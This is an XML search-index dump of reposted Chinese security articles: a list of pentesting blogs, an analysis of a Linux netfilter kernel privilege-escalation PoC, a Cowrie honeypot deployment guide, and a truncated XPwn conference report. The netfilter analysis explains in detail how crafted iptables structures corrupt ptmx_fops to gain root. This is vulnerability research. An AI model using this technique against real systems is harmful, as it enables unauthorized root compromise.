<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[13个有用的渗透测试资源博客]]></title>
      <url>http://www.linux52.com/2016-09-09-13-e4-b8-aa-e6-9c-89-e7-94-a8-e7-9a-84-e6-b8-97-e9-80-8f-e6-b5-8b-e8-af-95-e8-b5-84-e6-ba-90-e5-8d-9a-e5-ae-a2.html</url>
      <content type="html"><![CDATA[<p><strong>渗透测试是寻找能够用来攻击应用程序、网络和系统的漏洞的过程，其目的是检测会被黑客攻击的安全脆弱点。渗透测试可以检测如下内容：系统对攻击的反应，存在哪些会被攻击的脆弱点，如果有，系统中哪些数据会被窃取。</strong></p>
<h2 id="关于渗透测试"><a href="#关于渗透测试" class="headerlink" title="关于渗透测试"></a>关于渗透测试</h2><p>不要将渗透测试等同于简单的漏洞扫描或者安全审计，它还要除此之外的工作。渗透测试有助于寻找非常复杂的攻击向量，找到在开发阶段没能检测出来的漏洞。在遭到入侵之后，也常使用渗透测试，检测攻击者的攻击方法，还原出攻击方法，并阻止与此相同的攻击。</p>
<p>渗透测试是一些安全审计的主要构成部分，包括<a href="https://www.checkmarx.com/white_papers/how-to-achive-pci-dss-compliance-with-checkmarx-source-code-analysis/" target="_blank" rel="external">PCI-DSS规则</a>，它要求对处理或保存支付信息的系统每年进行渗透测试。渗透测试人员会协同使用人工和自动测试，利用大量的工具进行测试。</p>
<p>由于安全世界的动态性，以及黑客的变化性，安全专家需要掌握最新的技术、工具和漏洞利用方法，以及渗透测试技术。应用程序安全是一个新领域，物联网、容器、云等新的安全风险不断出现，渗透测试人员需要不断更新自己的知识。</p>
<p>因此，我们提供13个最有用的渗透测试博客，帮你获取最新知识，激励你的白帽人生。其中一些有好几年的渗透测试历程了。他们都值得你关注和学习。</p>
<p><a href="http://image.3001.net/images/20160831/14726207762774.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160831/14726207762774.png!small" alt="“If-I-had-6-h-to-chop-down-a-tree-I’d-spend-the-first-four-of-them-sharpening-my-axe.”-1.png"></a></p>
<h2 id="渗透测试博客和资源排名"><a href="#渗透测试博客和资源排名" class="headerlink" title="渗透测试博客和资源排名"></a>渗透测试博客和资源排名</h2><p><a href="http://carnal0wnage.attackresearch.com/" target="_blank" rel="external">Carnal0wnage</a></p>
<p>这个博客是由一个攻击研究团队维护的，是渗透测试人员最好的信息来源之一，博客上发布了渗透测试技术、发现、新闻等等。该团队在Black Hat上开设了培训课程。</p>
<p><a href="https://www.pentestgeek.com/" target="_blank" rel="external">PentestGeek</a></p>
<p>2012年开始活跃，PentestGeek博客致力于分享作者的经验。通过它也可以了解在大公司工作的经验丰富的渗透测试者的每日工作。</p>
<p><a href="http://www.darknet.org.uk/" target="_blank" rel="external">Darknet</a></p>
<p>1999年从一个IRC频道开始发展壮大，目前是一个定期更新的博客，讨论最新的渗透测试新闻、工具和技术，有30,000多个用户。</p>
<p><a href="http://www.lanmaster53.com/" target="_blank" rel="external">Lanmaster53</a></p>
<p>Tim Tomes维护的博客，Tim在博客中会详细描述他的研究成果，博客内容覆盖从Linux Shells、DEFCON badge hacking到AppSec hacks。</p>
<p><a href="http://marcoramilli.blogspot.co.il/" target="_blank" rel="external">Marco Ramilli</a></p>
<p>Marco是一个安全研究者和白帽黑客。他在教育界也很有名气，在数十年的工作经历中担任了各种教授和研究员职位。他的博客是对他的知识的扩展，Macro在博客上记录他发现的一些绝妙的技术。</p>
<p><a href="http://www.commonexploits.com/" target="_blank" rel="external">Common Exploits</a></p>
<p>由Daniel Compton维护，他是有20年的透测试经验的专家，Common Exploits旨在分享Daniel的技术，工具、漏洞利用方面的新闻，以及其它渗透测试领域的内容。</p>
<p><a href="http://pen-testing.sans.org/blog/pen-testing" target="_blank" rel="external">SANS Penetration Testing Blog</a></p>
<p>SANS对于应用程序安全方面的人来说是一个非常好的资源。这个博客上可以找到各种渗透测试任务和挑战，用于测试你的能力，也会发布特定的渗透测试工具和技术。</p>
<p><a href="https://blog.trailofbits.com/" target="_blank" rel="external">Trail of Bits Blog</a></p>
<p>由维护Trails of Bits的团队写的博客，这是一个在攻防领域都很专业的安全公司，这个博客收集了他们分享的知识，帮助企业改进或修复安全问题。</p>
<p><a href="http://www.digininja.org/" target="_blank" rel="external">DigiNinja</a></p>
<p>Digininja对渗透测试者来说是一个必须要知道的资源，主要关注Metasploit、Wifi和网络，Digininja是信息安全领域的人必读的网站。</p>
<p><a href="https://www.linkedin.com/groups/81676" target="_blank" rel="external">Ethical Hacking LinkedIn Group</a></p>
<p>最好的获取最新渗透测试新闻的办法是，在你喜欢的社交网站中，加入到一个组里面或者关注渗透测试大牛。Ethical Hacking group是众多社区中的一个，你可以加入并分享你自己的渗透测试资源。</p>
<p><a href="http://www.ehacking.net/" target="_blank" rel="external">EHacking.net</a></p>
<p>对所有渗透测试相关人员来说是一个非常棒的资源，Ehacking.net是又一个必须加入到书签的网站。</p>
<p><a href="http://seclists.org/" target="_blank" rel="external">Seclists.org</a></p>
<p>现在，依然有一部分信息安全社区依靠邮件列表获取信息，尽管这看起来有些过时。Nmap Security Scanner人员运营着Seclists.org网站，提供了受欢迎的邮件列表的清单。不管是菜鸟还是渗透测试专家都可以找到适合自己的邮件列表。</p>
<p><a href="http://www.kitploit.com/" target="_blank" rel="external">Kitploit</a></p>
<p>如果你在寻找特定类型的工具，你可以在Kitploit网站上找到。这里是渗透测试工具的宝库，把它加入到你的书签吧。</p>
<p><strong>* 参考来源：<a href="https://www.checkmarx.com/2016/07/26/13-helpful-pentesting-resources/" target="_blank" rel="external">checkmarx</a>，felix编译，转载请注明来自FreeBuf黑客与极客（FreeBuf.COM）</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux netfilter OOB root提权漏洞分析]]></title>
      <url>http://www.linux52.com/2016-09-09-linux-netfilter-oob-root-e6-8f-90-e6-9d-83-e6-bc-8f-e6-b4-9e-e5-88-86-e6-9e-90.html</url>
      <content type="html"><![CDATA[<p><strong>* 本文原创作者：肥肥草，本文属FreeBuf原创奖励计划，未经许可禁止转载
</strong></p>
<p><strong>著名的ExploitDatabase网站（<a href="http://www.exploit-db.com/" target="_blank" rel="external">www.exploit-db.com</a>）最近贴出了一个netfilter模块的提权POC，作者是Vitaly Nikolenko。OOB！Netfilter！顿感好奇，决定分析一下，现将分析过程和成果分享如下。</strong></p>
<h2 id="0×0-依葫芦画瓢提权成功"><a href="#0×0-依葫芦画瓢提权成功" class="headerlink" title="0×0 依葫芦画瓢提权成功"></a>0×0 依葫芦画瓢提权成功</h2><p>参照文章的提示，下载Ubuntu16.04并成功安装，uname -a确认版本号为4.4.0-21-generic。</p>
<p><a href="http://image.3001.net/images/20160826/14721806097863.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806097863.png!small" alt=""></a></p>
<p>下载POC，编译，按照提示关闭SMEP，加载ip_tables.ko，运行decr，等到出现“Done!Nowrun.pwn”后运行pwn，成功获得root shell。</p>
<p><a href="http://image.3001.net/images/20160826/14721806553492.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806553492.png!small" alt=""></a></p>
<p><a href="http://image.3001.net/images/20160826/14721806638786.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806638786.png!small" alt=""></a></p>
<h2 id="0×01-漏洞初识"><a href="#0×01-漏洞初识" class="headerlink" title="0×01 漏洞初识"></a>0×01 漏洞初识</h2><p>查看pwn.c的代码，可以看出POC采用了常见的通过ptmx提权方法：</p>
<p><a href="http://image.3001.net/images/20160826/14721806734085.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806734085.png!small" alt=""></a></p>
<p>猜测decr中修改了ptmx_fops的release指针，并根据代码可推断出修改后该指针的值为0xff814e30b0。然后pwn中调用close(fd)调用ptmx_fops-&gt;release函数，从而提权。</p>
<p>事实是否如此呢？</p>
<p>通过cat/proc/kallsyms查看ptmx_fops的地址为0xffffffff821de3e0，则release指针所在地址为0xffffffff821de3e0 + 13*8 = 0xffffffff821de448。</p>
<p>通过kgdb进行调试，查看在decr运行之前，0xffffffff821de448的值0xffffffff814e30b0，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721806934221.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806934221.png!small" alt=""></a></p>
<p>运行decr之后，0xffffffff821de448地址的值，为0x ff814e30b0，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721806982781.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721806982781.png!small" alt=""></a></p>
<p>也就是说，decr运行之后，0xffffffff821de448地址的值由0xffffffff814e30b0被修改为0xff814e30b0，而0xff814e30b0地址是应用层地址，是可控的，在pwn代码中向0xff814e30b0地址写入了提权ShellCode。</p>
<p>下面的问题就是decr是如何做到的，内核漏洞在哪？</p>
<h2 id="0×02-定位修改ptmx-fops关键指令"><a href="#0×02-定位修改ptmx-fops关键指令" class="headerlink" title="0×02 定位修改ptmx_fops关键指令"></a>0×02 定位修改ptmx_fops关键指令</h2><p>仔细分析decr.c，无非是设置了ipt_replace、ipt_entry等数据结构，然后调用setsockopt函数设置内核，看完之后仍然毫无头绪，还得从内核着手，看看应用层在调用完setsockopt函数之后内核到底做了那些事。</p>
<p>一种思路是重新编译内核，这样可以实现源码级的内核调试，但是重新编译之后一些内核参数（如ptmx_fops）地址发生改变，POC可能会运行失败，这样不利于定位修改ptmx_fops的漏洞代码。</p>
<p>所以还是针对Ubuntu16.04原生的内核进行调试，采用源码分析+动态调试的方法定位修改ptmx_fops的关键指令。本次采用的动态调试方法为vmware双虚拟机kgdb调试方法，具体方法可以通过百度获得，文中不再复述。</p>
<p>查看ip_tables.c源码，首先找到模块初始化函数ip_tables_init：</p>
<p><a href="http://image.3001.net/images/20160826/14721807126257.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807126257.png!small" alt=""></a></p>
<p>在ip_tables_init中，调用nf_register_sockopt注册处理函数，注册参数如下所示。</p>
<p><a href="http://image.3001.net/images/20160826/14721807201963.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807201963.png!small" alt=""></a></p>
<p>set函数有两个，do_ipt_set_ctl和compat_do_ipt_set_ctl，内核会调用哪一个函数呢？</p>
<p>通过kgdb双虚拟机调试，分别设置两个函数为断点，发现当应用层调用setsockopt时，内核调用的是compat_do_ipt_set_ctl，如下图所示。</p>
<p><a href="http://image.3001.net/images/20160826/14721807368122.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807368122.png!small" alt=""></a></p>
<p>继续分析，获得如下函数执行路径：</p>
<pre><code>compat_&lt;span class=&quot;hljs-keyword&quot;&gt;do&lt;/span&gt;_ipt_&lt;span class=&quot;hljs-built_in&quot;&gt;set&lt;/span&gt;_ctl--&amp;gt; compat_&lt;span class=&quot;hljs-keyword&quot;&gt;do&lt;/span&gt;_replace --&amp;gt; translate_compat_table --&amp;gt; check_compat_entry_size_and_hooks
</code></pre><p>POC代码中提示check_compat_entry_size_and_hooks/check_entry有问题，那么重点分析check_compat_entry_size_and_hooks函数，看是在那一步去修改了ptmx_fops，最好的办法是动态调试。</p>
<p>经过痛苦的、纯体力活的kgdb汇编代码调试，最终定位到是在compat_release_entry函数中修改了ptmx_fops，并且修改了两次，进一步跟踪定位到是该函数中的两个module_put函数修改了ptmx_fops。</p>
<p><a href="http://image.3001.net/images/20160826/14721807427692.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807427692.png!small" alt=""></a></p>
<p>同时通过打印$rdi（module_put的第一个参数）的值，发现该值为0xffffffff821de10d，如下所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721807541402.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807541402.png!small" alt=""></a></p>
<p>而该值正是decr.c中设置的magicnumber，如下图所示：</p>
<p><a href="http://image.3001.net/images/20160826/14721807629599.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807629599.png!small" alt=""></a></p>
<p>再看module_put函数：</p>
<p><a href="http://image.3001.net/images/20160826/14721807696298.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807696298.png!small" alt=""></a></p>
<p>其中最关键的就是对modue-&gt;refcnt减一。</p>
<p>refcnt在structmodule结构中的偏移为0×340，因此&amp;module-&gt;refcnt的值为 0xffffffff821de10d + 0×340 = 0xffffffff821de44d， 而ptmx_fops-&gt;tty_release的地址为0xffffffff821de448，因此当执行减一操作后，会将0xffffffff821de44d开始的0xff 0xff 0xff逐步减为0，最终ptmx_fops-&gt;tty_release的值变为0xff814e30b0。</p>
<p><a href="http://image.3001.net/images/20160826/14721807796432.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807796432.png!small" alt=""></a></p>
<p>到此，总算搞明白了，应用层通过构造特殊的ipt_replace、ipt_entry、xt_entry_match、xt_standard_target结构，将一个值为magic number的地址传到内核，并让内核中对该地址的内容执行多次-1操作，从而达到修改ptmx_fops的目的。</p>
<h2 id="0×03-漏洞成因分析"><a href="#0×03-漏洞成因分析" class="headerlink" title="0×03 漏洞成因分析"></a>0×03 漏洞成因分析</h2><p>通过上节分析知道，该漏洞可以在内核中修改应用层指定的地址，执行递减1的修改操作。那么内核代码中的漏洞到底在哪呢？</p>
<p>继续分析内核源代码ip_tables.c，既然问题出在ematch-&gt;u.kernel.match-&gt;me和t-&gt;u.kernel.target-&gt;me上，那么转到与之相关的代码处，即compat_copy_entry_from_user函数内部的代码，重点分析以下代码：</p>
<p><a href="http://image.3001.net/images/20160826/14721807991799.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721807991799.png!small" alt=""></a></p>
<p>将xt_ematch_foreach函数展开，如下：</p>
<p><a href="http://image.3001.net/images/20160826/14721808081529.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721808081529.png!small" alt=""></a></p>
<p>entry-&gt;elems指向的是紧跟在ipt_entry后的xt_entry_match（见如下示意图），即entry-&gt;elems= entry + sizeof(ipt_entry)，而sizeof(ipt_entry) = 112字节。</p>
<p><a href="http://image.3001.net/images/20160826/14721808182831.gif" target="_blank" rel="external"><img src="http://image.3001.net/images/20160826/14721808182831.gif!small" alt=""></a></p>
<p>由于应用层设置的target_offset为74，导致判断语句</p>
<p>(pos)&lt; (struct xt_entry_match <em>)(<span class="hljs-function"><span class="hljs-params">(char </span></span></em>)(entry) + \</p>
<p><span class="hljs-function"><span class="hljs-params">(entry)</span>-&gt;</span>target_offset); \</p>
<p>返回的结果为<strong>false</strong>，因此整个循环一次未能执行，也即compat_find_calc_match函数未能执行，本应在compat_find_calc_match函数中设置ematch-&gt;u.kernel.match-&gt;me的指令也未能执行。</p>
<p>与ematch错误处理情况类似，这段代码中，由于应用层设置的target_offset为74，导致t = compat_ipt_get_target()函数获取的target是错误的，后面尽管通过t-&gt;u.kernel.target= target;设置了target，但设置到了错误的地址，未改变真正的t-&gt;u.kernel.target值。</p>
<h2 id="0×4漏洞总结"><a href="#0×4漏洞总结" class="headerlink" title="0×4漏洞总结"></a>0×4漏洞总结</h2><p><strong>综上所属，该漏洞是内核netfilter处理setsockopt相关代码（check_compat_entry_size_and_hooks和check_entry函数）在处理应用层传下来的数据时审查不严格，处理逻辑也存在缺陷，使内核在调用module_put函数时操作了应用层传下来的地址，导致内核直接对应用层输入的地址执行减一操作，相当于是内核任意地址写漏洞。</strong></p>
<p>该漏洞要利用内核模块的module_put函数，而Android系统一般不打开内核模块动态加载功能，因此本文介绍的漏洞利用方法无法在Android系统上成功执行。</p>
<p>最近爆出和netfilters/getsockopt相关的漏洞不少，如CVE-2016-3134，后期将继续分析其他漏洞。</p>
<p>欢迎技术交流。本人QQ:16588753，root技术交流群:437812386。</p>
<p><strong>* 本文原创作者：肥肥草，本文属FreeBuf原创奖励计划，未经许可禁止转载 </strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Cowrie蜜罐部署教程]]></title>
      <url>http://www.linux52.com/2016-09-09-cowrie-e8-9c-9c-e7-bd-90-e9-83-a8-e7-bd-b2-e6-95-99-e7-a8-8b.html</url>
      <content type="html"><![CDATA[<h2 id="0-蜜罐分类："><a href="#0-蜜罐分类：" class="headerlink" title="0.蜜罐分类："></a>0.蜜罐分类：</h2><blockquote>
<p>低交互：模拟服务和漏洞以便收集信息和恶意软件，但是攻击者无法和该系统进行交互；</p>
<p>中等交互：在一个特有的控制环境中模拟一个生产服务，允许攻击者的部分交互；</p>
<p>高交互：攻击者可以几乎自由的访问系统资源直至系统重新清除恢复。<br><a href="http://image.3001.net/images/20160816/14713429741384.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713429741384.png!small" alt="Clipboard Image.png"></a></p>
</blockquote>
<h2 id="1-cowrie简介"><a href="#1-cowrie简介" class="headerlink" title="1.cowrie简介"></a><strong>1.cowrie简介</strong></h2><p><strong>它是一个具有中等交互的SSH蜜罐，安装在Linux中，它可以获取攻击者用于暴力破解的字典、输入的命令以及上传或下载的恶意文件。攻击者在上传恶意文件后，执行恶意文件的操作均会失败，所以对蜜罐本身来说比较安全。</strong></p>
<p><a href="http://image.3001.net/images/20160816/14713421328918.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713421328918.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="2-cowrie安装部署"><a href="#2-cowrie安装部署" class="headerlink" title="2.cowrie安装部署"></a>2.cowrie安装部署</h2><p>以下步骤均为root权限执行</p>
<p>l 添加非root用户</p>
<pre><code>adduser cowrie –p &lt;span class=&quot;hljs-strong&quot;&gt;*****&lt;/span&gt;**(设置密码，一路回车即可)
`&lt;/pre&gt;
l 安装各种python相关包
&lt;pre&gt;`apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install python-twistedpython-crypto python-pyasn1 python-gmpy2 python-mysqldb python-zope.&lt;span class=&quot;hljs-keyword&quot;&gt;interface&lt;/span&gt;
`&lt;/pre&gt;
l 安装virtualenv
&lt;pre&gt;`apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; install virtualenv
`&lt;/pre&gt;
l 下载cowire
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /optgit &lt;span class=&quot;hljs-built_in&quot;&gt;clone&lt;/span&gt; http://github.com/micheloosterhof/cowrie
`&lt;/pre&gt;
l 配置python虚拟环境
&lt;pre&gt;`cd &lt;span class=&quot;hljs-meta-keyword&quot;&gt;/opt/&lt;/span&gt;cowrie-master（cowrie-master就是我cowrie蜜罐的目录，如果目录不一致，重命名即可）virtualenv cowrie-envsource cowrie-env&lt;span class=&quot;hljs-meta-keyword&quot;&gt;/bin/&lt;/span&gt;activate(cowrie-env) $ pip install twistedcryptography pyopenssl gmpy2
`&lt;/pre&gt;
l 改变/opt/cowrie-master的拥有者
&lt;pre&gt;`&lt;span class=&quot;hljs-keyword&quot;&gt;chown&lt;/span&gt; -R cowrie:cowrie /opt/cowrie-master
`&lt;/pre&gt;
l 建立cowrie配置文件
&lt;pre&gt;`&lt;span class=&quot;hljs-selector-tag&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.cfg&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.dist&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;&lt;span class=&quot;hljs-selector-class&quot;&gt;.cfg&lt;/span&gt;
`&lt;/pre&gt;
l 修改日志的umask为0022（默认为0077）
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-mastervi start.sh
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/14713422633445.png!small)](http://image.3001.net/images/20160816/14713422633445.png)

l 修改蜜罐的SSH端口（默认为2222）
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-mastervi cowrie.cfg
`&lt;/pre&gt;
将linsten_port改为62223即可（最好大于60000，以防止被nmap默认扫描到）

[![Clipboard Image.png](http://image.3001.net/images/20160816/14713422921080.png!small)](http://image.3001.net/images/20160816/14713422921080.png)

l 将公网访问服务器22端口的请求做端口转发，转发到蜜罐的端口中
&lt;pre&gt;`&lt;span class=&quot;hljs-attribute&quot;&gt;iptables&lt;/span&gt; -t nat -A PREROUTING -p tcp--dport &lt;span class=&quot;hljs-number&quot;&gt;22&lt;/span&gt; -j REDIRECT --to-port &lt;span class=&quot;hljs-number&quot;&gt;62223&lt;/span&gt;
`&lt;/pre&gt;
l 将真正的（非蜜罐）SSH管理端口改为65522
&lt;pre&gt;`vi &lt;span class=&quot;hljs-meta-keyword&quot;&gt;/etc/&lt;/span&gt;ssh/sshd_config
`&lt;/pre&gt;
（备注：在第一次改SSH端口时，在前期测试时强烈建议同时保留22与65522，以防止修改保存后出现故障无法连接65522）

[![Clipboard Image.png](http://image.3001.net/images/20160816/14713423512894.png!small)](http://image.3001.net/images/20160816/14713423512894.png)

此处切换为cowrie用户操作

&lt;span style=&quot;color: #333333;&quot;&gt; 启动蜜罐&lt;/span&gt;
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-master./start.sh
`&lt;/pre&gt;

## 3\. 数据库安装部署

cowrie中产生的日志杂乱无章，即使放到日志分析工具中也很难制定规则去筛选。然而cowrie具备将攻击IP、时间、历史执行命令等记录直接存在数据库中，下面将说明如何配置数据库。

需要root权限或者sudo

l 安装mysql基础环境
&lt;pre&gt;`apt-get &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; libmysqlclient-devpython-dev pip &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; mysql-python apt-&lt;span class=&quot;hljs-keyword&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;install&lt;/span&gt; mysql-&lt;span class=&quot;hljs-keyword&quot;&gt;server&lt;/span&gt; python-mysqldb
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/1471342497649.png!small)](http://image.3001.net/images/20160816/1471342497649.png)

l 配置数据库与表

使用root用户建立名为cowrie的数据库并将该库中的所有表授权给cowrie
&lt;pre&gt;`&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;-pEnter&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;password&lt;/span&gt;: ******* &lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;DATABASE&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;;&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;ALL&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;hljs-selector-tag&quot;&gt;cowrie&lt;/span&gt;.* &lt;span class=&quot;hljs-selector-tag&quot;&gt;TOcowrie&lt;/span&gt;@&lt;span class=&quot;hljs-keyword&quot;&gt;localhost&lt;/span&gt; IDENTIFIED BY &lt;span class=&quot;hljs-string&quot;&gt;&apos;your_password&apos;&lt;/span&gt;;&lt;span class=&quot;hljs-selector-tag&quot;&gt;mysql&lt;/span&gt;&amp;gt;&lt;span class=&quot;hljs-selector-tag&quot;&gt;exit&lt;/span&gt;
`&lt;/pre&gt;
此时进入cowrie安装目录中，使用cowrie用户登录数据库，进入cowrie库中，将/opt/cowrie/ doc/sql/mysql.sql作为数据源即可制成多个表。
&lt;pre&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; /opt/cowrie-master mysql -u cowrie –pEnter password: ******* mysql&amp;gt;USE cowrie;mysql&amp;gt;&lt;span class=&quot;hljs-built_in&quot;&gt;source&lt;/span&gt; ./doc/sql/mysql.sqlmysql&amp;gt;&lt;span class=&quot;hljs-built_in&quot;&gt;exit&lt;/span&gt;
`&lt;/pre&gt;
停止cowrie，修改配置文件中的数据库配置，使配置文件中的密码与cowrie数据库用户密码一致。
&lt;pre&gt;`./&lt;span class=&quot;hljs-keyword&quot;&gt;stop&lt;/span&gt;.shvi cowrie.cfg
`&lt;/pre&gt;
[![Clipboard Image.png](http://image.3001.net/images/20160816/14713425641004.png!small)](http://image.3001.net/images/20160816/14713425641004.png)

保存后退出，并su到cowrie用户重启蜜罐
&lt;pre&gt;`./&lt;span class=&quot;hljs-keyword&quot;&gt;start&lt;/span&gt;.sh
</code></pre><p>cowrie库中的数据表如下：</p>
<p><a href="http://image.3001.net/images/20160816/14713425861902.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713425861902.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="4-配置文件说明"><a href="#4-配置文件说明" class="headerlink" title="4. 配置文件说明"></a>4. 配置文件说明</h2><p>data/userdb.txt——设置外部连接蜜罐时的密码，可以设置稍微复杂但是在攻击字典里，诱使攻击者进行暴力破解并获取其行为。</p>
<p><a href="http://image.3001.net/images/20160816/14713427507623.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427507623.png!small" alt="Clipboard Image.png"></a></p>
<p>log/cowrie.json与 log/cowrie.log——均为日志</p>
<p><a href="http://image.3001.net/images/20160816/14713427565036.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427565036.png!small" alt="Clipboard Image.png"></a></p>
<p>txtcmds/*——均为假的命令，其实打开就会发现完全就是txt</p>
<p><a href="http://image.3001.net/images/20160816/14713427601224.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427601224.png!small" alt="Clipboard Image.png"></a></p>
<p>dl/*——攻击者上传的文件均会复制到这里</p>
<p><a href="http://image.3001.net/images/20160816/14713427664682.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427664682.png!small" alt="Clipboard Image.png"></a></p>
<p>honeyfs/etc/motd——自定义欢迎/警告banner</p>
<p><a href="http://image.3001.net/images/20160816/14713427704917.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427704917.png!small" alt="Clipboard Image.png"></a></p>
<h2 id="5-阶段成果"><a href="#5-阶段成果" class="headerlink" title="5. 阶段成果"></a>5. 阶段成果</h2><p>如果想查询蜜罐中是否有攻击者的痕迹，SSH登录服务器后进入数据库，使用cowrie库，查询auth、sessions、input等表即可。<br>公网恶意IP可以从sessions表中去重获取，算是少量的威胁情报了，部分恶意IP如下。</p>
<p><a href="http://image.3001.net/images/20160816/14713427888255.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427888255.png!small" alt="Clipboard Image.png"></a></p>
<p>记录攻击者操作如下：</p>
<p><a href="http://image.3001.net/images/20160816/1471342793187.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/1471342793187.png!small" alt="Clipboard Image.png"></a></p>
<p><a href="http://image.3001.net/images/20160816/14713427975480.png" target="_blank" rel="external"><img src="http://image.3001.net/images/20160816/14713427975480.png!small" alt="Clipboard Image.png"></a></p>
<p>由上图可以看到攻击者在暴力破解成功后执行的命令，获取到这些恶意文件后进行分析，其大多数均为用于ddos的恶意程序，例如：</p>
<p><img src="http://image.3001.net/images/20160816/14713428022725.png!small" alt="Clipboard Image.png"><img src="http://image.3001.net/images/20160816/14713428057388.png!small" alt="Clipboard Image.png"></p>
<p>在长期收集蜜罐中的攻击者信息后，可以制定恶意IP列表直接在防火墙做阻断</p>
<p><strong>*本文作者：RipZ，转载须注明来自FreeBuf.COM</strong></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[一起看看首届XPwn大会都破解了啥？]]></title>
      <url>http://www.linux52.com/2016-09-09-e4-b8-80-e8-b5-b7-e7-9c-8b-e7-9c-8b-e9-a6-96-e5-b1-8axpwn-e5-a4-a7-e4-bc-9a-e9-83-bd-e7-a0-b4-e8-a7-a3-e4-ba-86-e5-95-a5-ef-bc-9f.html</url>
      <content type="html"><![CDATA[<ul>
<li>FreeBuf官方报道，作者/ArthurKiller，转载请注明来自FreeBuf（FreeBuf.COM）</li>
</ul>
<p><a href="http://image.3001.net/images/20160901/14726823437365.jpg" target="_blank" rel="external"><img src="http://image.3001.net/images/20160901/14726823437365.jpg!small" alt="592247857235212791.jpg"></a></p>
<p><strong>8月31日，第一届XPwn在北京召开。参赛选手成功攻破了小米，索尼，思科，极路由，西门子等众多厂商的相关硬件设备，查找到数十个安全漏洞，并且第一时间将破解方式和解决方案提供给相关厂商。本次大会有10组参赛选手，大会评委团则由国内外顶尖级安全专家与学者组成，分别来自蚂蚁金服、阿里巴巴、腾讯、百度等国内知名互联网公司，以及知名高校和网络安全研究团队。</strong></p>
<p>本次XPwn大会的主题为「未来安全，探索盛会」。在大会开场白的时候，XCon和 XPwn创始人王英键（网名呆神） 说到：“做安全就是做未来，我们需要重视安全，关注安全和了解安全。未来的安全是什么？它是以什么形态存在？它所具备的威胁是什么？发现问题和解决问题，这个是我们的目标，也是我们的责任。”</p>
